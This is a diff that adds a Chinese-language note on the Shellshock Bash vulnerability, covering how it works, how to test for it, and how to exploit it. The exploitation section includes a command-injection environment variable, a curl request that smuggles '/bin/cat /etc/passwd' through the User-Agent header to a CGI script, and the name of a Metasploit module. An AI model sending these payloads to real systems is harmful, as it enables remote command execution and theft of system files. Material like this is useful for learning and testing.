@@ -1,0 +1,44 @@
+Bash 4.3 及更早版本基本确认可以使用
+
+Shellshock漏洞（CVE-2014-6271及其后续相关漏洞）是Bash解释器的严重安全漏洞，允许攻击者通过环境变量注入恶意代码并执行任意命令。以下是其主要利用方法及相关信息：
+ 一、漏洞原理
+当Bash处理包含函数定义的环境变量时，会错误地执行函数定义后的附加命令，导致命令注入。例如，环境变量值形如 `() { :; }; <恶意命令>` 时，Bash会在解析时执行 `<恶意命令>`。
+
+ 二、检测是否存在漏洞
+1. 命令行检测  
+   在终端执行以下命令，若输出包含 ` vulnerable` 或异常结果，则存在漏洞：  
+   ```bash
+   env x='() { :; }; echo vulnerable' bash -c "echo this is a test"
+   ```
+   正常输出：`this is a test`  
+   漏洞存在时输出：`vulnerable\nthis is a test`（或类似）
+
+2. 检查Bash版本  
+   漏洞影响Bash 1.3到4.3版本（版本号 < 4.3补丁17），查看版本：  
+   ```bash
+   bash --version
+   ```
+
+ 三、利用方法
+ 1. 命令行直接利用（本地/远程shell）
+通过导出恶意环境变量并触发Bash解析：  
+```bash
+# 导出包含恶意命令的环境变量（例如执行whoami）
+export TEST='() { :; }; /bin/whoami'
+# 执行任意命令（触发Bash解析环境变量）
+bash -c "echo hello"
+```
+此时`/bin/whoami`会被执行，输出当前用户。
+
+
+ 2. Web场景利用（HTTP头注入）
+许多Web服务器（如CGI脚本、FastCGI）会将HTTP头（如User-Agent、Cookie）转换为环境变量，攻击者可通过构造恶意请求触发漏洞：  
+- 攻击示例（curl）：  
+  ```bash
+  curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" http://目标URL/cgi-bin/脚本
+  ```
+  若服务器使用Bash处理CGI环境变量，会执行`/bin/cat /etc/passwd`，返回敏感文件内容。
+
+- Metasploit模块利用：  
+  使用模块 `exploit/multi/http/apache_mod_cgi_bash_env_exec`，配置目标URL后执行攻击，可获取远程命令执行权限。
+
